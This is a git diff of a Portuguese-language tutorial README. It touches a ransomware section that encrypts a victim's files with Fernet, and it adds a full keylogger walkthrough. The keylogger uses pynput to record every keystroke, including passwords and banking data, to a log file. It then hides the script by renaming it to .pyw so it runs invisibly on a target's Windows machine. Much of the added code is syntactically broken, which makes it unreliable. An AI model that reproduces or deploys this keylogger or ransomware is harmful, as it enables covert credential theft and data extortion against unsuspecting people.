@@ -16,7 +16,7 @@ O que é ransomware? é um tipo de software malicioso(malware) onde o intuito de
 
 ##### Primeiro precisa-mos ter a biblioteca do cryptography.fernet e a Fernet intalada no seu IDEs.
 
-feito isto iremos comecar.
+feito isto iremos começar.
 
 ```python
 from cryptography.fernet import Fernet
@@ -54,7 +54,7 @@ def criptografar_arquivo(arquivo, chave):
 ```
             
 <img width="646" height="415" alt="cripto" src="https://github.com/user-attachments/assets/bb532750-6b2c-444e-a796-6b2daaaac8cf" />
-
+"<!-- no pc-->"
 No pc do alvo ele fica desta forma, todo codificado.
 
 4- Esta funcao sera a responsavel por vasculhar os arquivos dentro da pasta da vitima:
@@ -153,3 +153,105 @@ def main():
  if __name__ == "__main__":
         main()    
 ```
+Quando terminar o processo de descriptografar , aparecera uma tela avisando que foi concluido o processo.
+___________________________________________________________________________________________________________________________________________________________________
+
+# KEYLOGGER
+
+## O que é Keylogger?
+Keylogger é um tipo de malware que seu objetivo é resgatar tudo que a vitima escrever em seu teclado é gravado em um arquivo , isto inclui senhas, dados bancarios e todo tipo de informacoes que voce digitar em seu computador.
+
+### Como criar um arquivo de teste para este malware
+Veremos a seguir como um script simples, pode ter um poder imenso sobre dados do seu pc.
+
+Para iniciarmos precisamos primeiramente baixar a biblioteca de pynput que é responsavel por permitir o monitoramento do teclado da vitima em tempo real.
+Toda vez que uma tecla for acionada "precionada" ele vai chamar uma funcao automaticamente no codigo.
+```
+pip install pynput
+```
+1- Depois de instalado vamos começar orientando qual a biblioteca iremos usar
+
+```python
+from pynput import keyboard
+```
+
+2- logo em vamos usar um comando para ignorar , Onde tirare-mos algumas teclas que nao queremos que grave em nosso log
+
+```python
+IGNORAR = {
+    keyboard.Key.shift,
+    keyboard.Key.shift_r,
+    keyboard.Key.ctrl_l,
+    keyboard.Key.ctrl_r,
+    keyboard.Key.alt_l,
+    keyboard.Key.alt_r,
+    keyboard.Key.caps_lock,
+    keyboard.Key.cmd,
+}
+
+```
+3- Depois de fazer a lista de teclas ignoradas, iremos dar a funcao ****on_press**** é uma funcao de extrema importancia, pois toda vez que o teclado for precionado, automaticamente ela sera chamada. 
+
+3a-E dentro do dela iremos usar um comando chamado ***TRY*** que tem a funcao de tentar capturar os caracteres do teclado se for uma tecla normal" como uma letra ou numero". 
+
+3b-A funcao ***char*** vai ser responsavel por escrever os caracteres em um arquivo chamado "log.txt"
+
+```python
+def on_press(Key):
+            Try:
+               #se for uma tecla normal, escreva-la no arquivo (letra, numero, simbolo)
+             with open("log.txxt", "a", Encoding="utf-8") as f:
+            f.write(Key.char)
+```
+
+4- Agora iremos organizar as teclas que nao sao considerada caracteres como " enter, espaco, backspace"
+```python
+ except.AttributeError:
+            with open("log.txt", "a" encoding="utf-8") as f:
+                if Key not in IGNORAR:
+                       f.write("  ")
+                elif key == keyboard.Key.enter:
+                       f.write("\n")   
+                elif key == keyboard.Key.tab:
+                    f.write(" \t")
+                elif Key == keyboard.Key.backspace:
+                       f.write("  ")
+                elif key == keyboard.Key.esc:
+                       f.write(" [esc ]")
+                elif key in IGNORAR:
+                        pass
+                else    :
+                    f.write(f" [{Key}] ")
+```
+Sem este comando se tentarmos capturar estas teclas ele vai dar como except, por isto temos que orientar os except, para corrigir nesta situacao.
+
+Para finalizar usaremos:
+
+```python
+ with keyboard.Listener(on_press=on_press) as listener:
+                        listener.join()
+
+```
+
+Listener: É a onde iniciamos o comando de esculta
+
+Listener.join : Este vai manter o script rodando ate que ele seja interrompido de forma manual.
+
+O comando ja esta quase pronto
+
+#### Abrindo o terminal
+
+Colocaremos o comando 
+
+```
+ren .\keylogger.py .\keylogger.pyw
+```
+Com este comando ele irar mudar a extencao do arquivo, fazendo com que ele comece a rodar em segundo plano no windowns, assim o keylloger vai ficar invisivel no pc da vitima.
+
+Para que o script comece a rodar usaremos o comando:
+
+```
+python .\keylogger.pyw
+```
+com este comando o key ja estara rondando de forma invisivel na maquina do alvo e capturando cada tecla precionada em tempo real em seu py.
+
